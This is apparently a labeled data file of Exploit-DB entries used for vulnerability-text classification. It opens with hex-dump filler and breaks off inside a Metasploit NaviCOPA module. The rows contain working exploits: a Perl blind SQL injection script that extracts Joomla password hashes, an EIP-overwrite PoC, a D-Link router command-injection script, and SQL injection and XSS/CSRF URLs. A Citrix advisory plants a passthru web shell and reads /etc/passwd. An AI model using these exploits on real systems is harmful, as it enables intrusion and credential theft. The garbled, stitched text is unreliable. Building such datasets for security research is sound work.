00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC560 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC570 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC580 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC590 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC5A0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC5B0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC5C0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC5D0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC5E0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC5F0 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC600 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC610 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC620 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC630 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................ 000000003D9EC640 | 00 ",,
,,0,
25365,"AN HTTPD 1.42 - Arbitrary Log Content Injection source: https://www.securityfocus.com/bid/13069/info  AN HTTPD is affected by a vulnerability that may allow remote attacker to inject arbitrary content in to the log file. This issue arises due to a failure of input validation.  Corruption of logs may result in concealing attacks and/or misleading an administrator.  This issue can also be exploited to carry out other attacks such as the execution of certain BAT file commands. This can result in the disclosure of source code and text files.  This issue may also aid in the exploitation of the vulnerability described in BID 13066 (AN HTTPD CMDIS.DLL Remote Buffer Overflow Vulnerability).  AN HTTPD 1.42n is reported vulnerable, however, it is possible that other versions are affected as well.   http://www.example.com/a%20HTTP/1.0""%20200%202048%0d%0a255.255.255.255%20-%20-%20[06/Mar/2005%3a22%3a31%3a11%20+0800]%20""GET%20/hack  http://www.example.com/%0d%0atype%20cgi-bin%5Ctest.bat  To parse a command through 'cmdIS.DLL': http://www.example.com/scripts/cmdIS.dll/httpd.log",HTTP,0
22209,"PHPMyShop 1.0 - 'compte.php' SQL Injection source: https://www.securityfocus.com/bid/6746/info  phpMyShop, in some cases, does not sufficiently sanitize user-supplied input which is used when constructing SQL queries. As a result, attackers may supply malicious parameters to manipulate the structure and logic of SQL queries.   This vulnerability was reported to exist in the compte.php script file. A remote attacker can exploit this vulnerability to bypass the phpMyShop authentication/registration process.  http://[target]/compte.php?achat=1&valider=1&identifiant='%20OR%20''='&password='%20OR%20''='",constructing SQL queries,1
38705,"Sam Spade 1.14 - Browse URL Buffer Overflow (PoC) ﻿#!/usr/bin/env python # Exploit Title     : Sam Spade 1.14 Browse URL Buffer Overflow PoC # Discovery by      : Nipun Jaswal # Email             : mail@nipunjaswal.info # Discovery Date    : 14/11/2015 # Vendor Homepage   : http://samspade.org # Software Link     : http://www.majorgeeks.com/files/details/sam_spade.html # Tested Version    : 1.14 # Vulnerability Type: Denial of Service / Proof Of Concept/ Eip Overwrite # Tested on OS      : Windows 7 Home Basic # Crash Point       : Go to Tools > Browse Web> Enter the contents of 'sam_spade_browse_url.txt' > OK , Note: Do #Not Remove the http:// ########################################################################################## #  -----------------------------------NOTES----------------------------------------------# ########################################################################################## # And the Stack #0012F73C   41414141  AAAA #0012F740   41414141  AAAA #0012F744   DEADBEAF  ¯¾­Þ  # Registers #EAX 00000001 #ECX 00000001 #EDX 00000030 #EBX 00000000 #ESP 0012F74C #EBP 41414141 #ESI 008DA260 #EDI 0176F4E0 #EIP DEADBEAF  f = open(""sam_spade_browse_url.txt"", ""w"") Junk = ""A""* 496 eip_overwrite = ""\xaf\xbe\xad\xde"" f.write(Junk+eip_overwrite) f.close()",e.g. a specially crafted .TPC file,1
40795,"WordPress Plugin Instagram Feed 1.4.6.2 - Cross-Site Request Forgery <!-- Source: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_in_instagram_feed_plugin_via_csrf.html  Persistent Cross-Site Scripting in Instagram Feed plugin via CSRF Abstract A persistent Cross-Site Scripting vulnerability was found in the Instagram Feed plugin. This issue allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a URL provided by an attacker.  Contact For feedback or questions about this advisory mail us at sumofpwn at securify.nl  The Summer of Pwnage This issue has been found during the Summer of Pwnage hacker event, running from July 1-29. A community summer event in which a large group of security bughunters (worldwide) collaborate in a month of security research on Open Source Software (WordPress this time). For fun. The event is hosted by Securify in Amsterdam.  OVE ID OVE-20160724-0014  Tested versions This issue was successfully tested on the Instagram Feed WordPress Plugin version 1.4.6.2.  Fix This issue is resolved in Instagram Feed WordPress Plugin version 1.4.7.  Introduction Instagram Feed is a WordPress plugin to display beautifully clean, customizable, and responsive feeds from multiple Instagram accounts. A persistent Cross-Site Scripting vulnerability was found in the Instagram Feed plugin. This issue allows an attacker to perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf. In order to exploit this issue, the attacker has to lure/force a logged on WordPress Administrator into opening a URL provided by an attacker.  Details The settings page of the Instagram Feed plugin does not perform CSRF checks. It's possible to change all settings in the plugin by making an authenticated administrator perform a request to change the settings (CSRF). It's possible to change the Instagram access token and id to show images of other users. It's also possible to inject malicious JavaScript in the Customize section, to perform Persistent Cross-Site Scripting. Any user visiting the Instagram Feed will be injected with the attackers payload after the CSRF attack.  Proof of Concept Have an authenticated admin visit a webpage with the following form: -->  <html> <body> <form action=""http://<wordpress site>/wp-admin/admin.php?page=sb-instagram-feed&tab=customize"" method=""POST""> <input type=""hidden"" name=""sb&#95;instagram&#95;settings&#95;hidden&#95;field"" value=""Y"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;customize&#95;hidden&#95;field"" value=""Y"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;width"" value=""100"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;width&#95;unit"" value=""&#37;"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;height"" value=""100"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;height&#95;unit"" value=""&#37;"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;background"" value=""&#35;474747"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;sort"" value=""none"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;num"" value=""20"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;cols"" value=""4"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;image&#95;res"" value=""auto"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;image&#95;padding"" value=""5"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;image&#95;padding&#95;unit"" value=""px"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;show&#95;header"" value=""on"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;header&#95;color"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;show&#95;btn"" value=""on"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;btn&#95;background"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;btn&#95;text&#95;color"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;btn&#95;text"" value=""Load&#32;More&#46;&#46;&#46;"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;show&#95;follow&#95;btn"" value=""on"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;folow&#95;btn&#95;background"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;follow&#95;btn&#95;text&#95;color"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;follow&#95;btn&#95;text"" value=""Follow&#32;on&#32;Instagram"" /> <input type=""hidden"" name=""sb&#95;instagram&#95;exclude&#95;words"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;include&#95;words"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;hide&#95;photos"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;block&#95;users"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;custom&#95;css"" value="""" /> <input type=""hidden"" name=""sb&#95;instagram&#95;custom&#95;js"" value=""&#125;&#13;&#10;&#125;&#41;&#59;<&#47;script><script>alert&#40;1&#41;&#59;<&#47;script>&#13;&#10;"" /> <input type=""hidden"" name=""submit"" value=""Save&#32;Changes"" /> <input type=""submit"" value=""Submit request"" /> </form> </body> </html>  <!-- The Custom JavaScript section will now be saved with the attacker's JavaScript payload. -->","perform a wide variety of actions, such as stealing Administrators' session tokens, or performing arbitrary actions on their behalf",1
10016,"Joomla! Component JForJoomla! Jreservation 1.5 - 'pid' SQL Injection #!/usr/bin/perl -w  #--------------------------------------------------------------------------------- #joomla component com_jreservation (pid) Blind SQL Injection Vulnerability #---------------------------------------------------------------------------------  #Author         : Chip D3 Bi0s #Group          : LatiHackTeam #Email          : chipdebios[alt+64]gmail.com #Date           : 17 September 2009 #Critical Lvl   : Moderate #Impact	       : Exposure of sensitive information #Where	       : From Remote #---------------------------------------------------------------------------  #Affected software description: #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  #Application   : JReservation Hotel Booking Component #version       : 1.5 #Developer     : Can & Will #License       : GPL            type  : Commercial #Date Added    : 15 September 2009 #Demo          : http://jforjoomla.com/cd-hotel #Download      : http://www.jforjoomla.com/Download-document.html?gid=47  #Description   :  #Joomla 1.5 Jreservation Component for hotel booking system. #Jreservation is a specially designed component for hotel owners who provides lodging #facility & online booking for the rooms like deluxe, Air conditioned, Non Air conditioned. #By using this Joomla 1.5 Jreservation component you can add multiple room types, amenity  #types like room amenity or property amenity. Amenity are like additional services which the #hotel owner provides with the room e.g. Telephone, internet connection, cable connection and #property amenity like swimming pool, gym, etc. With the help of a calender the user or a  #customer of the hotel can check rooms availability also book room as a provisional booking.  #---------------------------------------------------------------------------   #I.Blind SQL injection (pid) #Poc/Exploit: #~~~~~~~~~~~  #http://www.example.com/[path]/index.php?option=com_jreservation&task=propertycpanel&pid=X[blind] #X: Valid pip   #Demo Live: #~~~~~~~~~ #http://www.example.com/cd-hotel/index.php?option=com_jreservation&task=propertycpanel&pid=1+and+1=1 #etc, etc...  #+++++++++++++++++++++++++++++++++++++++ #[!] Produced in South America #+++++++++++++++++++++++++++++++++++++++   use LWP::UserAgent; use Benchmark; my $t1 = new Benchmark;   print ""\t\t------------------------------------------------------------\n\n""; print ""\t\t                      |  Chip d3 Bi0s |                     \n\n""; print ""\t\t JReservation Hotel Booking Component                        \n\n""; print ""\t\t Joomla Component com_jreservation (pid) BSQL                \n\n""; print ""\t\t-------------------------------------------------------------\n\n"";   print ""http://localhost/Path       : "";chomp(my $target=<STDIN>); print "" [-] Introduce pid          : "";chomp($z=<STDIN>); print "" [-] Introduce coincidencia : "";chomp($w=<STDIN>);   $column_name=""concat(password)""; $table_name=""jos_users"";   $b = LWP::UserAgent->new() or die ""Could not initialize browser\n""; $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');  print ""----------------Inyectando----------------\n"";  #es Vulnerable?   $host = $target . ""/index.php?option=com_jreservation&task=propertycpanel&pid="".$z.""+and+1=1"";   my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;   if ($content =~ /$regexp/) {  $host = $target . ""/index.php?option=com_jlord_rss&task=feed&id="".$z.""+and+1=2"";   my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;   if ($content =~ /$regexp/) {print "" [-] Exploit Fallo :(\n"";}  else  {print "" [-] Vulnerable :)\n"";  for ($x=1;$x<=32;$x++)  	{    $host = $target . ""/index.php?option=com_jreservation&task=propertycpanel&pid="".$z.""+and+ascii(substring((SELECT+"".$column_name.""+from+"".$table_name.""+limit+0,1),"".$x."",1))>57"";   my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;   print "" [!] "";if($x <= 9 ) {print ""0$x"";}else{print $x;}#para alininear 0..9 con los 10-32    if ($content =~ /$regexp/)   {              for ($c=97;$c<=102;$c++)   {  $host = $target . ""/index.php?option=com_jreservation&task=propertycpanel&pid="".$z.""+and+ascii(substring((SELECT+"".$column_name.""+from+"".$table_name.""+limit+0,1),"".$x."",1))="".$c."""";  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;    if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print ""-Caracter: $char\n""; $c=102;}  }     } else {  for ($c=48;$c<=57;$c++)   {  $host = $target . ""/index.php?option=com_jreservation&task=propertycpanel&pid="".$z.""+and+ascii(substring((SELECT+"".$column_name.""+from+"".$table_name.""+limit+0,1),"".$x."",1))="".$c."""";  my $res = $b->request(HTTP::Request->new(GET=>$host));  my $content = $res->content;  my $regexp = $w;   if ($content =~ /$regexp/) {$char=chr($c); $caracter[$x-1]=chr($c); print ""-Caracter: $char\n""; $c=57;}  }   }  	} print "" [+] Password   :""."" "".join('', @caracter) . ""\n""; my $t2 = new Benchmark; my $tt = timediff($t2, $t1); print ""El script tomo:"",timestr($tt),""\n"";  } }  else  {print "" [-] Exploit Fallo :(\n"";}",the malicious alert,1
9106,"citrix xencenterweb - Cross-Site Scripting / SQL Injection / Remote Code Execution Secure Network - Security Research Advisory  Vuln name: Citrix XenCenterWeb Multiple Vulnerabilities  Systems affected: Citrix XenCenterWeb Systems not affected: n/a Severity: High Local/Remote: Remote Vendor URL: http://www.citrix.com Author(s): Alberto Trivero a.trivero@securenetwork.it  -    Claudio Criscione c.criscione@securenetwork.it Vendor disclosure: 1/06/2009 Vendor acknowledged: 11/06/2009 Vendor patch release: n/a Public disclosure: 06/07/2009 Advisory number: SN-2009-01 Advisory URL: http://securenetwork.it/ricerca/advisory/download/SN-2009-01.txt   *** SUMMARY ***  Citrix XenCenterWeb is a web interface for Citrix XenServer environment  management. Users of XenCenterWeb will be able to see a list of Virtual Machines in the  Resource Pool, perform life-cycle actions (start, shutdown, restart, etc.),  get basic information about the hosts in the Resource Pools, information about  the VMs and also connect to the console of the VMs.  Due to poor validation of some user controlled inputs, a variety of attacks  against the application and the underlying server are possible. Cross-site scripting, cross-site request forgery, SQL injection and remote  command execution attack vectors were identified as well.   XSS and CSRF attacks can be performed on the virtual appliance itself, while  the others require the PHP parameter magic_quotes_gpc to be off on the web  server.  *** VULNERABILITY DETAILS ***  (a) Cross-site Scripting (XSS) and Cross-site Request Forgery (CSRF) With the default PHP configuration (register_globals=Off and  magic_quotes_gpc=On), both XSS and CSRF attacks can be executed.  The first XSS attack exploits the lack of sanitization in the username  parameter in edituser.php script and requires the victim to be able to access  configuration scripts:  https://xencenterweb.loc/config/edituser.php?username=1<script>alert(document.cookie)</script>  Under the same conditions, a CSRF attack can be executed to change the  password of an arbitrary user: https://xencenterweb.loc/config/changepw.php?username=[victim_username]&newpass=[attacker's_chosen_pwd]  Another CSRF attack can hard stop a VM of the attacker's choice: https://xencenterweb.loc/hardstopvm.php?stop_vmref=[VMref]&stop_vmname=[VMname]  Other XSS vulnerabilities afflict scripts which are accessible by anyone: https://xencenterweb.loc/console.php?location=1""><script>alert(document.cookie)</script><""&vmname=myVM https://xencenterweb.loc/console.php?location=1&sessionid=1""><script>alert(123)</script><""&vmname=myVM https://xencenterweb.loc/console.php?location=1&sessionid=1&vmname=myVM<script>alert(123)</script> https://xencenterweb.loc/forcerestart.php?vmrefid=1""><script>alert(123)</script><""&vmname=myVM https://xencenterweb.loc/forcerestart.php?vmrefid=1&vmname=myVM""><script>alert(123)</script><"" https://xencenterweb.loc/forcesd.php?vmrefid=1&vmname=myVM""><script>alert(123)</script><"" https://xencenterweb.loc/forcesd.php?vmrefid=1""><script>alert(123)</script><""&vmname=myVM  (b) SQL Injection The username parameter in the login.php script is vulnerable to a Blind SQL  Injection attack. An attacker can retrieve the whole database schema through specially crafted  requests. Here is an example proof of concept: https://xencenterweb.loc/login.php?username=user' UNION SELECT if(user() LIKE  'root@%', benchmark(1000000,sha1('test')), 'false')/* Obviously, other high profile attacks can be performed through this attack  vector.  (c) Remote Command Execution An attacker could write arbitrary data in the file  /usr/local/lib/php/include/config.ini.php through the file /var/www/config/writeconfig.php. Due to this unsecure behavior,  arbitrary commands can be executed on the machine. If a victim with the proper authorization follows this link: https://xencenterweb.loc/config/writeconfig.php?pool1='; ?> <?php $cmd =  $_REQUEST['cmd']; passthru($cmd); ?> <?php $xen = ' or this URL encoded version: https://xencenterweb.loc/config/writeconfig.php?pool1=%27%3B%20%3F%3E%20%3C%3Fphp%20%24cmd%20%3D%20%24_REQUEST%5B%27cmd%27%5D%3B%20passthru%28%24cmd%29%3B%20%3F%3E%20%3C%3Fphp%20%24xen%20%3D%20%27 an attacker can then simply execute commands on the system through the  console.php file: https://xencenterweb.loc/console.php?cmd=cat%20/etc/passwd;   *** EXPLOIT ***  Attackers may exploit these issues through a common browser as explained  above.    *** FIX INFORMATION ***  No patch is currently provided by Citrix, and the application download has  been removed. Citrix officially stated that ""the tool was created to demonstrate how the SDK  could be used to create unique solutions. Customers currently using it should  assess the risks of continued use in light of your findings and, if these prove  to be unacceptable, discontinue usage"".   *** WORKAROUNDS ***  Common web application workarounds apply, like virtual patching from a web  application firewall or similar solutions. However most of the reported issues  can be mitigated by running the application only inside the virtual appliance  or in properly configured web servers.  Secure Network would like to thank Citrix for its support during the  disclosure process.   ********************* *** LEGAL NOTICES *** *********************  Secure Network (www.securenetwork.it) is an information security company,  which provides consulting and training services, and engages in security  research and development.   We are committed to open, full disclosure of vulnerabilities, cooperating whenever possible with software developers for properly handling disclosure.  This advisory is copyright 2009 Secure Network S.r.l. Permission is  hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. It  may not be edited in any way without the express consent of Secure Network  S.r.l. Permission is explicitly given for insertion in vulnerability  databases and similars, provided that due credit is given to Secure Network.  The information in the advisory is believed to be accurate at the time of  publishing based on currently available information. This information is provided as-is, as a free service to the community by Secure Network  research staff. There are no warranties with regard to this information.  Secure Network does not accept any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  If you have any comments or inquiries, or any issue with what is reported  in this advisory, please inform us as soon as possible.  E-mail: securenetwork {at} securenetwork.it GPG/PGP key: http://www.securenetwork.it/pgpkeys/Secure%20Network.asc Phone: +39 02 24126788  # milw0rm.com [2009-07-10]",specially crafted,1
24496,"SonicWALL Scrutinizer 9.5.2 - SQL Injection Title: ====== Sonicwall Scrutinizer v9.5.2 - SQL Injection Vulnerability   Date: ===== 2013-02-13   References: =========== http://www.vulnerability-lab.com/get_content.php?id=789  #9984: Investigate Vulnerability Lab issues (this ticket included tracking the creation of our DBI shim to error on semi-colon) #10149: Create a common function to escape characters that can be used for SQL injection #10139: Review all mapping and flow analytics queries to make sure inputs included in SQL are escaped #10141: Review all reporting and filtering queries to make sure inputs included in SQL are escaped #10140: Review all alarm tab and admin tab queries to make sure inputs included in SQL are escaped   VL-ID: ===== 789   Common Vulnerability Scoring System: ==================================== 7.3   Introduction: ============= Dell SonicWALL Scrutinizer is a multi-vendor, flow-based application traffic analytics, visualization and reporting tool  to measure and troubleshoot network performance and utilization while increasing productivity for enterprises and service providers.  Scrutinizer supports a wide range of routers, switches, firewalls, and data-flow reporting protocols, providing unparalleled insight  into application traffic analysis from IPFIX/NetFlow data exported by Dell SonicWALL firewalls, as well as support for a wide range  of routers, switches, firewalls, and data-flow reporting protocols. IT administrators in charge of high throughput networks can  deploy Scrutinizer as a virtual appliance for high performance environments.   (Copy of the Vendor Homepage: http://www.sonicwall.com/us/en/products/Scrutinizer.html )    Abstract: ========= The Vulnerability Laboratory Research Team discovered SQL Injection vulnerability in the Dells Sonicwall OEM Scrutinizer v9.5.2 appliance application.   Report-Timeline: ================ 2012-12-05:	Researcher Notification & Coordination 2012-12-07:	Vendor Notification 2013-01-08:	Vendor Response/Feedback 2013-02-10:	Vendor Fix/Patch 2013-02-11:	Public Disclosure   Status: ======== Published   Affected Products: ================== DELL Product: Sonicwall OEM Scrutinizer 9.5.2   Exploitation-Technique: ======================= Remote   Severity: ========= High   Details: ======== A blind SQL Injection vulnerability is detected in the Sonicwall OEM Scrutinizer v9.5.2 appliance application. The bug allows remote attackers to execute/inject own sql statement/commands to manipulate the affected vulnerable application dbms. The sql injection vulnerability is located in the fa_web.cgi file with the bound gadget listing module and the vulnerable orderby or  gadget parameters. Exploitation requires no user interaction & without privileged application user account. Successful exploitation of  the remote sql vulnerability results in dbms & application compromise.   Vulnerable File(s): 			[+] fa_web.cgi  Vulnerable Module(s): 			[+] gadget listing  Vulnerable Parameter(s): 			[+] orderby 			[+] gadget   Proof of Concept: ================= The remote sql injection vulnerability can be exploited by remote attackers without required privileged application user account  and also without user interaction. For demonstration or reproduce ...  PoC: http://127.0.0.1:1339/cgi-bin/fa_web.cgi?gadget=applicationsbytes-1%27[SQL INJECTION VULNERABILITY!]&orderby=1&cachebreaker=23_52_5_814-1%27 http://127.0.0.1:1339/cgi-bin/fa_web.cgi?gadget=applicationsbytes&orderby=-1%27[SQL INJECTION VULNERABILITY!]&cachebreaker=23_52_5_814-1%27    Solution: ========= 1) Scrutinizer team created a own DB layer that will die if a semicolon is found within a SQL query 2) We have changed more queries to pass inputs as bound variables to the DB engine which prevents possible SQL injection   Risk: ===== The security risk of the remote sql injection vulnerability is estimated as high(+).   Credits: ======== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@vulnerability-lab.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright � 2012 | Vulnerability Laboratory    --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com",a malicious PHP script,1
38724,"D-Link DIR-601 - Command Injection ## Advisory Information  Title: DIR-601 Command injection in ping functionality  Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink) CVE: None  Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060,  http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061  However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes.   ## Product Description  DIR601 -- Wireless N150 Home Router. Mainly used by home and small offices.  ## Vulnerabilities Summary  Have come across 1 security issue in DIR601 firmware which allows an attacker to exploit command injection in ping functionality. The user needs to be logged in. After that any attacker on wireless LAN or if mgmt interface is exposed on Internet then an internet attacker can execute the attack. Also XSRF can be used to trick administrator to exploit it.  ## Details  Command injection in dir-601 ---------------------------------------------------------------------------------------------------------------------- import socket import struct  # CMD_INJECTION_INPINGTEST # Just need user to be logged in and nothing else   buf = ""POST /my_cgi.cgi HTTP/1.0\r\n"" buf+=""HOST: 192.168.1.8\r\nUser-Agent: test\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection:keep-alive\r\nAccept-Encoding:gzip,deflate,sdch\r\nAccept-Language:en-US,en;q=0.8\r\nContent-Length:101\r\n\r\n"" buf+=""request=ping_test&admin3_user_name=admin1;echo admin > /var/passwd1;test&admin4_user_pwd=admin2&user_type=0""+""\r\n\r\n""   print ""[+] sending buffer size"", len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""IP_ADDRESS"", 80)) s.send(buf) ----------------------------------------------------------------------------------------------------------------------  ## Report Timeline  * April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline. * July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor * Nov 13, 2015: A public advisory is sent to security mailing lists.  ## Credit  This vulnerability was found by Samuel Huntley",malicious purposes,1
21741,"XnView 1.99.1 - '.JLS' File Decompression Heap Overflow SUMMARY  XnView Formats PlugIn is prone to an overflow condition. The JLS Plugin (xjpegls.dll) library fails to properly sanitize user-supplied input resulting in a heap-based buffer overflow. With a specially crafted JLS compressed image file, a context-dependent attacker could potentially execute arbitrary code.  POC file posted at: http://www.reactionpenetrationtesting.co.uk/vuln.jls                     https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/21741.jls  CVE number: CVE-2012-4988 Impact: High Vendor homepage: http://www.xnview.com/ Vendor notified: 29/06/2012 Vendor response: Fix was promised for 1.99.1 but no fix was released Found by: Joseph Sheridan, Director of Reaction Information Security ABOUT REACTIONIS  Reaction Information Security is a leading independent pen test consultancy specialising in delivering the highest quality services including network pen testing and web application security testing. As a CESG CHECK Service Provider we are authorised to carry out penetration testing on classified government networks.  AFFECTED PRODUCTS  XnView 1.99 and 1.99.1, 'All Plugins 1.90' and Xjpegls.dll (version 1.96.0.0) previous versions may also be affected.  DETAILS  XnView Formats PlugIn is prone to an overflow condition. The JLS Plugin (xjpegls.dll) library fails to properly sanitize user-supplied input resulting in a heap-based buffer overflow. With a specially crafted JLS compressed image file, a context-dependent attacker could potentially execute arbitrary code.  IMPACT  If a user could be enticed to open a malicious JLS file, the attack could result in remote code execution.  SOLUTION  No solution at the time of writing. Never open files from untrusted sources.  DISTRIBUTION  In addition to posting on the website, a text version of this notice has been posted to the following e-mail and Usenet news recipients.  bugtraq () securityfocus com full-disclosure () lists grok org uk Future updates of this advisory, if any, will be reflected on this page, but may or may not be actively announced on mailing lists or newsgroups. Users concerned about this problem are encouraged to check the current page for any updates.",a specially crafted JLS compressed image file,1
24356,"Moodle 1.x - 'post.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/10884/info  It is reported that Moodle is vulnerable to a cross-site scripting vulnerability. This issue is due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamic web content.  This issue could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and would allow for theft of cookie-based authentication credentials or other attacks.  Versions of Moodle prior to 1.3.4 are reported susceptible to this vulnerability.  http://www.example.com/moodle/mod/forum/post.php?reply=%3Cscript%3Ealert(document.cookie);%3C/script%3E",create a malicious URI link that includes hostile HTML and script code,1
28489,"Easy Address Book Web Server 1.2 - Remote Format String source: https://www.securityfocus.com/bid/19842/info  Easy Address Book Web Server is prone to a remote format-string vulnerability because the application fails to properly sanitize user-supplied data before including it in the format-specifier argument to a formatted-printing function.  This issue allows remote attackers to execute arbitrary machine code in the context of the affected server process, facilitating the complete compromise of affected computers. Failed exploit attempts will likely crash the service.  Easy Address Book Web Server version 1.2 is vulnerable to this issue; other versions may also be affected.  http://www.example.com/?%25n",including it in the format-specifier argument to a formatted-printing function,1
16808,"NaviCOPA Web Server 2.0.1 - URL Handling Buffer Overflow (Metasploit) ## # $Id: navicopa_get_overflow.rb 9797 2010-07-12 23:25:31Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	HttpFingerprint = { :pattern => [ /InterVations/ ] }  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'NaviCOPA 2.0.1 URL Handling Buffer Overflow', 			'Description'    => %q{ 				This module exploits a stack buffer overflow in NaviCOPA 2.0.1. 				The vulnerability is caused due to a boundary error within the 				handling of URL parameters. 			}, 			'Author'         => 'MC', 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 9797 $', 			'References'     => 				[ 					[ 'CVE', '2006-5112' ], 					[ 'OSVDB', '29257' ], 					[ 'BID', '20250' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 				}, 			'Privileged'     => true, 			'Payload'        => 				{ 					'Space'    => 400, 					'BadChars' => ""\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c"", 					'StackAdjustment' => -3500, 				}, 			